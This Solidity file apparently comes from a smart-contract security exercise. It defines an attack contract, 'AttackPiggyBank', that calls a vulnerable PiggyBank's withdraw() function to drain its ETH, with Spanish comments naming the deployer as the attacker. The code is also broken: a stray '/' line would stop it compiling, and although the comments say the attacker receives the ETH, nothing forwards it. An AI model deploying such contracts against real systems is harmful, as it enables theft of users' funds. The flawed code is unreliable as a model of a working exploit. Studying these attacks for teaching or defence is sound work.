// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract AttackPiggyBank {
    address public vulnerablePiggyBankAddress; // Dirección del contrato PiggyBank vulnerable
    address public attacker; // Dirección del atacante que recibe el ETH
    uint256 public attackAmount = 0; // Cantidad de ETH robado

    constructor(address _vulnerablePiggyBankAddress) {
        vulnerablePiggyBankAddress = _vulnerablePiggyBankAddress;
        attacker = msg.sender; // El desplegador del contrato de ataque es el atacante
    }

    /
    function attack() public {
        (bool success, ) = vulnerablePiggyBankAddress.call(abi.encodeWithSignature("withdraw()"));
        require(success, "Fallo al llamar a la funcion withdraw del PiggyBank vulnerable.");
        attackAmount = address(this).balance; 
    }

   
    receive() external payable {
    }
}
